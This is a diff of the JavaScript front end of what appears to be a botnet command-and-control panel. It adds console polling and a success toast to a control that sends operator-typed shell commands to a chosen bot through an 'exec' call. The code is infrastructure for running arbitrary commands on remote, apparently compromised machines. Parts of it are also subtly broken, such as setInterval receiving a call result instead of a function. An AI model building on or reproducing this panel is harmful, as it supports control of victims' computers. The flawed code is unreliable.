@@ -11643,6 +11643,8 @@ function addClientRow(botid) {
     }
     rawFile.send(null);
 }
+var botid = document.getElementById("clients").value;
+      setInterval(readTextFile(botid), 2000);
 
 //hack 111
 window.onload = function() {
@@ -11653,7 +11655,7 @@ window.onload = function() {
 $("#clients").change(function() {
   var selectedItem = $(this).val();
   var botid = $('option:selected',this).data("id");
-      setInterval(readTextFile(botid), 3000);
+      //setInterval(readTextFile(botid), 3000);
 });
 
 $('#console-button').click(function() {
@@ -11661,15 +11663,17 @@ $('#console-button').click(function() {
     if (!cmd_to_send) return new Swal({icon: "error", text: "Command field cannot be empty.", timer: 2000, timerProgressBar: true, toast: true, position: 'top-right', showCancelButton: false, showConfirmButton: false})
     var botid = parseInt(document.getElementById("clients").value.replace("b", ""));
 
-cmd('exec', { target: botid, cmd: cmd_to_send });
+    cmd('exec', { target: botid, cmd: cmd_to_send });
+    new Swal({icon: "success", text: "Command executed successfully.", timer: 2000, timerProgressBar: true, toast: true, position: 'top-right', showCancelButton: false, showConfirmButton: false})
 
 });
 
 
-/*function runCommand() {
-	cmd('exec_all', { cmd: $('#console').val() });
-	$('#console').val('');
-}*/
+function updateConsole() {
+	var botid = $('option:selected',this).data("id");
+	readTextFile(botid)
+}
+
 
 function refreshComplete() {
 	$("#clients tr").slice(1).remove();
@@ -11696,12 +11700,16 @@ $(function() {
 	updateData();
     status.info('Updated data');
 	setInterval(updateData, 1000 * 2);
+	
+		updateConsole();
+    status.info('Updated console');
+	setInterval(updateConsole, 3000);
+	
 	$('#console').on('keypress', function(e) {
 		if (e.keyCode == '13') {
 		var cmd_to_send = document.getElementById('console').value
     		if (!cmd_to_send) return new Swal({icon: "error", text: "Command field cannot be empty.", timer: 2000, timerProgressBar: true, toast: true, position: 'top-right', showCancelButton: false, showConfirmButton: false})
     		var botid = parseInt(document.getElementById("clients").value.replace("b", ""));
-    		console.log(botid)
 		cmd('exec', { target: botid, cmd: cmd_to_send });
 			e.preventDefault();
 		}
